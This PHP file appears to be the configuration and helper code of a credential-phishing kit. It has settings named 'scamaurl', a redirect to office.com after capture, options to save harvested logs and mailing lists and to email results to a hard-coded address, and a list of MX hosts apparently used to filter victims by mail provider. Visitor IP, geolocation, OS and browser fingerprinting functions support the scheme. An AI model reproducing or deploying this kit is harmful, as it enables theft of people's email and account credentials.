<?php

define('9A466B642B0D29A62244DFB3521AF1E7A1333C9C111235243BE8AD0452A1666D3386D35C8ABE350505387D1164FF997C0238742',true);

error_reporting(E_ALL ^ E_NOTICE);
ini_set('display_errors', 0);
ini_set('error_log', 'error.log');

$use_auth = true;
$afa = 'casta';
$psw = '$2y$10$x4A47URa4n3UpLWf070gYeFtYR9KAoCIa.fpxurlbRCqmtuT8oeVi';
$sesLogged = '';
$scamaurl = "auth"; 
$originalurl = "https://www.office.com";
//$originalurl = 'https://workspace.google.com/marketplace/app/online_fax/249935525835';
$rabi = "don@doniqish.co.za";			// If you change then API errors won't be sent. Don't touch :()
$filltimes = 4;
$multivisit = 'yes';					// Options: 'yes' for repeat visits, 'no' for one-time visit 
$show_captchaa = "yes";
date_default_timezone_set('GMT');
$dateNow = date("d/m/Y h:i:s A");
$saveintext = "yes";
$savechkertext = "yes";
$chkrfilename = "1logs01";
$filename = "logsh434ewdedfbksiery679";
$maillistfilename = "qxdswraz.txt";
$sendtoemail = "yes";
$autograbemail = "yes";				// Options: 'yes' for automatic, 'no' for manual 

$invalid = [
			'secureserver.net',
			'gmail-smtp-in.l.google.com',
			'aspmx.l.google.com',
			'yahoodns.net',
			'biz.mail.yahoo.com',
			'olc.protection.outlook.com',
			'hotmail.com',
			'prodigy.net'
];

function mx_exists( $email, $needle ) {
	$mail_part = explode( "@", $email );
	$domain = $mail_part[1];
	if( checkdnsrr( $domain,'MX' ) ) {
		if( getmxrr( $domain , $mxhosts , $weight ) ) {
			foreach( $needle as $item ) {
				foreach( $mxhosts as $key => $hay ) {
					if( stripos( $hay, $item ) !== FALSE ) {
						return TRUE;
					} 
				}
			}
		}
	}
}

function mxrecord($email, $mx) {
	$domain = substr(strrchr($email, "@"), 1);
	$arr = dns_get_record($domain, DNS_MX);
	if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])) {
		$gotten = $arr[0]['target'];
	}
	if( stripos( $gotten, $mx ) !== FALSE ) {
		return TRUE;
	} 
}

function show_visitor_ip() {
	if(!empty($_SERVER['HTTP_CLIENT_IP'])){
		if(filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
		{
			$ip = $_SERVER['HTTP_CLIENT_IP'];
		}
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
		if(filter_var($_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
		{
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}
	} else {
		if(filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP))
		{
			$ip = $_SERVER['REMOTE_ADDR'];
		}
	}
	return $ip;
}

function show_visitor_locationByIp($svip){
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote  = @$_SERVER['REMOTE_ADDR'];
	if(filter_var($client, FILTER_VALIDATE_IP)){		
	   $ip = $client;
	}elseif(filter_var($forward, FILTER_VALIDATE_IP)){
	   $ip = $forward;
	} else {
		$ip = $remote;
	}
	if(filter_var($ip,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!==false){
		$IPaddress = $ip;;
	}

	$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$IPaddress));    
	  
	$svip_data = 'unknown';
	$svip_ltype = $svip;
	  
	if($ip_data && $ip_data->geoplugin_countryName != null){
		switch($svip_ltype) {
			case 'continentName':
			$svip_data = $ip_data->geoplugin_continentName;
			break;
			case 'countryCode':
			$svip_data = $ip_data->geoplugin_countryCode;
			break;
			case 'region':
			$svip_data = $ip_data->geoplugin_regionName;
			break;
			case 'lat':
			$svip_data = $ip_data->geoplugin_latitude;
			break;
			case 'long':
			$svip_data = $ip_data->geoplugin_longitude;
			break;
			case 'city':
			$svip_data = $ip_data->geoplugin_city;
			break;
			case 'timezone':
			$svip_data = $ip_data->geoplugin_timezone;
			break;
			case 'currencyCode':
			$svip_data = $ip_data->geoplugin_currencyCode;
			break;
			default:
			$svip_data = $ip_data->geoplugin_countryName;
		}
	}
	return $svip_data;
}

function getOs(){
	$os_platform="Unknown OS";
	$all=array('/windows nt 10/i'=>'Windows 10','/windows nt 6.3/i'=>'Windows 8.1','/windows nt 6.2/i'=>'Windows 8','/windows nt 6.1/i'=>'Windows 7','/windows nt 6.0/i'=>'Windows Vista','/windows nt 5.2/i'=>'Windows Server 2003/XP x64','/windows nt 5.1/i'=>'Windows XP','/windows xp/i'=>'Windows XP','/windows nt 5.0/i'=>'Windows 2000','/windows me/i'=>'Windows ME','/win98/i'=>'Windows 98','/win95/i'=>'Windows 95','/win16/i'=>'Windows 3.11','/macintosh|mac os x/i'=>'Mac OS X','/mac_powerpc/i'=>'Mac OS 9','/linux/i'=>'Linux','/ubuntu/i'=>'Ubuntu','/iphone/i'=>'iPhone','/ipod/i'=>'iPod','/ipad/i'=>'iPad','/android/i'=>'Android','/blackberry/i'=>'BlackBerry','/webos/i'=>'Mobile');
	foreach($all as $regex=>$value){
		if(preg_match($regex,$_SERVER['HTTP_USER_AGENT'])){$os_platform=$value;}
	}
	return $os_platform;
}

function getBrowser(){
	$browser="Unknown Browser";
	$all=array('/msie/i'=>'Internet Explorer','/firefox/i'=>'Firefox','/safari/i'=>'Safari','/chrome/i'=>'Chrome','/edge/i'=>'Edge','/opera/i'=>'Opera','/netscape/i'=>'Netscape','/maxthon/i'=>'Maxthon','/konqueror/i'=>'Konqueror','/mobile/i'=>'Handheld Browser');
	foreach($all as $regex=>$value){
		if(preg_match($regex,$_SERVER['HTTP_USER_AGENT'])){
			$browser=$value;
		}
	}
	return $browser;
}

if (!function_exists('array_column')) {
	function array_column($input = null, $columnKey = null, $indexKey = null)
	{
		$argc = func_num_args();
		$params = func_get_args();

		if ($argc < 2) {
			trigger_error("array_column() expects at least 2 parameters, {$argc} given", E_USER_WARNING);
			return null;
		}

		if (!is_array($params[0])) {
			trigger_error(
				'array_column() expects parameter 1 to be array, ' . gettype($params[0]) . ' given',
				E_USER_WARNING
			);
			return null;
		}

		if (!is_int($params[1])
			&& !is_float($params[1])
			&& !is_string($params[1])
			&& $params[1] !== null
			&& !(is_object($params[1]) && method_exists($params[1], '__toString'))
		) {
			trigger_error('array_column(): The column key should be either a string or an integer', E_USER_WARNING);
			return false;
		}

		if (isset($params[2])
			&& !is_int($params[2])
			&& !is_float($params[2])
			&& !is_string($params[2])
			&& !(is_object($params[2]) && method_exists($params[2], '__toString'))
		) {
			trigger_error('array_column(): The index key should be either a string or an integer', E_USER_WARNING);
			return false;
		}

		$paramsInput = $params[0];
		$paramsColumnKey = ($params[1] !== null) ? (string) $params[1] : null;

		$paramsIndexKey = null;
		if (isset($params[2])) {
			if (is_float($params[2]) || is_int($params[2])) {
				$paramsIndexKey = (int) $params[2];
			} else {
				$paramsIndexKey = (string) $params[2];
			}
		}

		$resultArray = array();

		foreach ($paramsInput as $row) {
			$key = $value = null;
			$keySet = $valueSet = false;

			if ($paramsIndexKey !== null && array_key_exists($paramsIndexKey, $row)) {
				$keySet = true;
				$key = (string) $row[$paramsIndexKey];
			}

			if ($paramsColumnKey === null) {
				$valueSet = true;
				$value = $row;
			} elseif (is_array($row) && array_key_exists($paramsColumnKey, $row)) {
				$valueSet = true;
				$value = $row[$paramsColumnKey];
			}

			if ($valueSet) {
				if ($keySet) {
					$resultArray[$key] = $value;
				} else {
					$resultArray[] = $value;
				}
			}

		}

		return $resultArray;
	}

}

function is_email($input) {
	$pattern = '/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){255,})(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){65,}@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\]))$/iD';

	if (preg_match($pattern, $input) === 1) {
		return TRUE;
	}
}

function isBase64($data)
{
    if (base64_encode(base64_decode($data)) === $data) {
        return true;
    } else {
        return false;
    }
}

class Random{
  public static function Numeric($length)
      {
          $chars = "1234567890";
          $clen   = strlen( $chars )-1;
          $id  = '';

          for ($i = 0; $i < $length; $i++) {
                  $id .= $chars[mt_rand(0,$clen)];
          }
          return ($id);
      }

  public static function Alphabets($length)
      {
          $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
          $clen   = strlen( $chars )-1;
          $id  = '';

          for ($i = 0; $i < $length; $i++) {
                  $id .= $chars[mt_rand(0,$clen)];
          }
          return ($id);
      }

  public static function AlphaNumeric($length)
      {
          $chars = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
          $clen   = strlen( $chars )-1;
          $id  = '';

          for ($i = 0; $i < $length; $i++) {
                  $id .= $chars[mt_rand(0,$clen)];
          }
          return ($id);
      }
}

function encodeDomain($email) {
	$split = explode('@', $email);
	$domain = urlencode('http://'.$split[1]);
	return $domain;
}

